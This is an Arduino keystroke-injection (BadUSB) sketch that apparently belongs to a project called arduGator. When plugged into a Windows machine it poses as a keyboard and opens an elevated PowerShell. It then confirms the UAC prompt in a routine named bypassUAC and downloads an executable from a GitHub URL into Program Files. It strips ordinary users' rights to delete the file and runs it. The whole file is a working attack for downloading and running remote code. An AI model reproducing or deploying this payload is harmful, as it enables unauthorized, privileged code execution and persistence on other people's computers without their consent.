#include <Keyboard.h>

#define DELAY_MULT 30
#define URL "https://github.com/germanquero/arduGator/raw/refs/heads/main/alligator/exe_dwnld/alligator.exe"
#define NAME "Alligator"

void pressShiftedKey(char key) {
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(key);
  delay(DELAY_MULT);
  Keyboard.release(key);
  Keyboard.release(KEY_LEFT_SHIFT);
  delay(DELAY_MULT);
}

void pressGrKey(char key) {
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press(key);
  delay(DELAY_MULT);
  Keyboard.release(key);
  Keyboard.release(KEY_RIGHT_ALT);
  delay(DELAY_MULT);
}

char mapSpanishToUS(char c) {
    switch (c) {

    // Shift y AltGr de los Números
    case '!': pressShiftedKey('1'); break;
    case '"': pressShiftedKey('2'); break;
    case '·': pressShiftedKey('3'); break;
    case '$': pressShiftedKey('4'); break;
    case '%': pressShiftedKey('5'); break;
    case '&': pressShiftedKey('6'); break;
    case '/': pressShiftedKey('7'); break;
    case '(': pressShiftedKey('8'); break;
    case ')': pressShiftedKey('9'); break;
    case '=': pressShiftedKey('0'); break;
    
    // AltGr combinaciones específicas del español
    case '|': pressGrKey('1'); break; // AltGr+1
    case '@': pressGrKey('2'); break; // AltGr+2
    case '#': pressGrKey('3'); break; // AltGr+3
    case '~': pressGrKey('4'); break; // AltGr+4
    case '€': pressGrKey('5'); break; // AltGr+5
    case '¬': pressGrKey('6'); break; // AltGr+6
    case '{': pressGrKey('\''); break; // AltGr+´
    case '}': pressGrKey('+'); break; // AltGr+ç
    case '\\': pressGrKey('`'); break; // AltGr+º

    // Caracteres especiales directos
    case ';': pressShiftedKey(','); break;
    case ':': pressShiftedKey('.'); break;
    case '-': Keyboard.write('/'); break;
    case '_': pressShiftedKey('/'); break;

    // Espacio y otros básicos que a veces no funcionan
    case ' ': Keyboard.write(' '); break;
    case '\n': Keyboard.write(KEY_RETURN); break;

    // Fall-back
    default: Keyboard.write(c); break;
  }
}

void printString(String string){
  char buf[string.length() + 1];
  string.toCharArray(buf, string.length() + 1);
  for(int i = 0; i <= string.length(); ++i){
    mapSpanishToUS(buf[i]);
    delay(DELAY_MULT * 2);
  }
}

void bypassUAC(){
  delay(DELAY_MULT * 125);
  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.release(KEY_LEFT_ARROW);
  delay(DELAY_MULT);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(DELAY_MULT * 50);
}

void runCommand(String command){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(DELAY_MULT * 5);
  printString(command);
  delay(DELAY_MULT * 5);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(DELAY_MULT * 50);
}

void setup() {
  Keyboard.begin();
  delay(DELAY_MULT * 75);
  
  runCommand("powershell Start-Process powershell -Verb runAs");
  bypassUAC();

  printString("cd $Env:ProgramFiles");
  Keyboard.press(KEY_RETURN);
  delay(DELAY_MULT);
  Keyboard.release(KEY_RETURN);
  delay(DELAY_MULT);
  printString("New-Item \".\\alligator\" -ItemType \"directory\"");
  Keyboard.press(KEY_RETURN);
  delay(DELAY_MULT);
  Keyboard.release(KEY_RETURN);
  delay(DELAY_MULT);
  printString("Invoke-WebRequest -Uri \"" + String(URL) + "\" -OutFile \".\\" + String(NAME) + "\\" + String(NAME) + ".exe\"; icacls \".\\" + String(NAME) + "\\" + String(NAME) + ".exe\" /inheritance:r /grant:r \"Administradores:F\" /deny \"Usuarios:(DE,DC)\"");
  Keyboard.press(KEY_RETURN);
  delay(DELAY_MULT);
  Keyboard.release(KEY_RETURN);
  delay(DELAY_MULT);
  printString(".\\" + String(NAME) + "\\" + String(NAME) + ".exe");
  Keyboard.press(KEY_RETURN);
  delay(DELAY_MULT);
  Keyboard.release(KEY_RETURN);
  delay(DELAY_MULT);
  

}

void loop() {} 
